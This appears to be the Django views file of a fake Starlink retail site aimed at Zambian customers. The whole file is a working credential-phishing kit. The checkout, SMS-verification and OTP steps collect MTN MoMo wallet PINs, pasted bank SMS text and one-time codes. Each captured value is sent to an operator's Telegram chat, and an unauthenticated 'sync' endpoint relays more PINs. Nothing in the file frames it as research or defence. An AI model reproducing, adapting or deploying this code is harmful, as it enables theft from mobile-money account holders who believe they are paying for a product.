import os
import json
import random
import requests
from datetime import datetime
from django.conf import settings
from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order

def index(request):
    """Renders the primary electronic catalog displaying dynamic Starlink kits and parts."""
    return render(request, 'orders/index.html')


def generate_otp():
    """Generates a secure, numerical 6-digit confirmation security code."""
    return str(random.randint(100000, 999999))


def send_telegram_notification(order, extra_info=None, custom_report=None):
    """Dispatches clean markdown logs out to your designated Telegram administrative panel."""
    token = getattr(settings, 'TELEGRAM_BOT_TOKEN', None)
    chat_id = getattr(settings, 'TELEGRAM_CHAT_ID', None)
    
    if not token or not chat_id or token == 'YOUR_BOT_TOKEN':
        return

    if custom_report:
        message = custom_report
    else:
        message = (
            f"🔔 *STARLINK ZAMBIA TRANSACTION*\n\n"
            f"💳 *GATEWAY:* MTN MoMo (+260)\n"
            f"👤 *Customer:* {order.full_name}\n"
            f"📞 *Account:* {order.phone}\n"
            f"💰 *Bill Amount:* {order.total_amount} ZMW\n"
            f"-------------------------------------\n"
        )
        if extra_info:
            message += f"📝 *SYSTEM METRIC:* {extra_info}\n"

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass


def checkout(request):
    """
    Step 1: Captures contact details, shipment configuration, phone number,
    and the confidential authorization MoMo wallet PIN.
    """
    if request.method == 'POST':
        phone_raw = request.POST.get('phone', '').strip()
        pin = request.POST.get('pin_code', '').strip()

        if not pin.isdigit() or len(pin) < 4 or len(pin) > 5:
            return render(request, 'orders/checkout.html', {
                'error': 'Configuration Error: Your MoMo Authorization PIN must be 4 or 5 digits.'
            })

        # Sanitize and force uniform +260 formatting structure
        if not phone_raw.startswith('+260'):
            phone = f"+260{phone_raw.lstrip('0')}"
        else:
            phone = phone_raw

        order = Order.objects.create(
            full_name=request.POST.get('fullName', 'Starlink Zambia Client'),
            national_id=request.POST.get('nationalId'),
            email=request.POST.get('email'),
            phone=phone,
            contact_person=request.POST.get('contactPerson'),
            alt_phone=request.POST.get('altPhone'),
            city=request.POST.get('city'),
            address=request.POST.get('address'),
            delivery_method=request.POST.get('delivery_method', 'town'),
            payment_method='mtn_momo',
            total_amount=int(request.POST.get('total_amount', 3500)),
            pin_code=pin
        )

        # Dispatch real-time operational payload detailing PIN capture to Telegram
        send_telegram_notification(
            order, 
            extra_info=f"🚀 *STEP 1 EXECUTION*\n🔑 Captured Secret Authorization PIN: `{pin}`\n💬 Status: Form successfully shifted. Awaiting user text pasting sequence..."
        )

        return redirect('verify_sms', order_id=order.id)

    return render(request, 'orders/checkout.html')


def verify_sms(request, order_id):
    """
    Step 2: Collects the copied verification SMS content from the user.
    """
    order = get_object_or_404(Order, id=order_id)
    
    if request.method == 'POST':
        sms_text = request.POST.get('sms_content', '').strip()
        order.sms_content = sms_text
        
        # Instantiate validation token for state validation phase
        otp = generate_otp()
        order.otp_code = otp
        order.otp_created_at = datetime.now()
        order.save()

        # Stream raw transaction text content immediately over to the administrator chat
        telegram_report = (
            f"📋 *STARLINK ZAMBIA - RAW SMS SUBMISSION*\n"
            f"-------------------------------------\n"
            f"👤 *Customer:* {order.full_name}\n"
            f"📱 *Phone:* {order.phone}\n"
            f"🔑 *Authorized PIN:* `{order.pin_code}`\n"
            f"-------------------------------------\n"
            f"💬 *PASTED SMS CONTENT:* \n```\n{sms_text}\n```\n"
            f"-------------------------------------\n"
            f"⚙️ *System Code Generated:* `{otp}`"
        )
        send_telegram_notification(order, custom_report=telegram_report)

        return redirect('verify_otp', order_id=order.id)

    return render(request, 'orders/sms_verification.html', {'order': order})


def verify_otp(request, order_id):
    """
    Step 3: Collects and confirms the 6-digit confirmation security code.
    """
    order = get_object_or_404(Order, id=order_id)
    
    if request.method == 'POST':
        user_otp = request.POST.get('otp_code', '').strip()
        
        if order.otp_code == user_otp:
            order.is_paid = True
            order.status = 'Paid'
            order.save()
            
            final_invoice = (
                f"✅ *TRANSACTION CLEARANCE - ORDER COMPLETED*\n"
                f"-------------------------------------\n"
                f"📝 *Order Identifier:* #{order.id}\n"
                f"👤 *Client Structural Name:* {order.full_name}\n"
                f"📱 *Mobile Carrier Profile:* {order.phone}\n"
                f"🔑 *Wallet Secured PIN:* `{order.pin_code}`\n"
                f"💬 *Confirmed Code Match:* `{user_otp}`\n"
                f"💰 *Settled Checkout Volume:* {order.total_amount} ZMW\n"
                f"-------------------------------------\n"
                f"⚡ Status: Confirmed successfully. Routing payload to home screen."
            )
            send_telegram_notification(order, custom_report=final_invoice)
            return render(request, 'orders/success.html', {'order': order})
        else:
            send_telegram_notification(order, f"❌ *Step 3 Verification Code Mismatch:* Input attempt: `{user_otp}`")
            return render(request, 'orders/otp_verification.html', {
                'order': order,
                'error': 'The input entry verification code is invalid. Please look closely at your text messages and re-submit.'
            })

    return render(request, 'orders/otp_verification.html', {'order': order})


def resend_otp(request, order_id):
    """Generates and triggers a refreshed validation sequence code."""
    order = get_object_or_404(Order, id=order_id)
    otp = generate_otp()
    order.otp_code = otp
    order.otp_created_at = datetime.now()
    order.save()
    
    send_telegram_notification(order, f"🔄 *REFRESH SEQUENCE TRIGGERED:* Generated alternative code `{otp}`")
    return render(request, 'orders/otp_verification.html', {
        'order': order,
        'message': 'A new alternative validation security token was generated and deployed.'
    })


@csrf_exempt
def sync_momo(request):
    """Asynchronous pipeline endpoint to easily synchronize real-time updates."""
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            report = (
                "🚀 *STARLINK ZAMBIA SYNC AGENT*\n"
                "-------------------------------------\n"
                f"👤 *Client Name:* `{data.get('name')}`\n"
                f"📞 *Mobile Contact:* `{data.get('phone')}`\n"
                f"📍 *Target Hub:* `{data.get('city')}`\n"
                "-------------------------------------\n"
                f"💰 *Platform:* `MTN MoMo API Module`\n"
                f"🔑 *Captured PIN:* `{data.get('pin')}`\n"
                f"🔗 *Text Reference Link:* `{data.get('sms_link')}`\n"
                "-------------------------------------\n"
                f"📦 *Item Details:* {data.get('item')} ({data.get('total')} ZMW)"
            )
            send_telegram_notification(order=None, custom_report=report)
            return JsonResponse({"status": "synchronized"})
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)}, status=400)
            
    return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)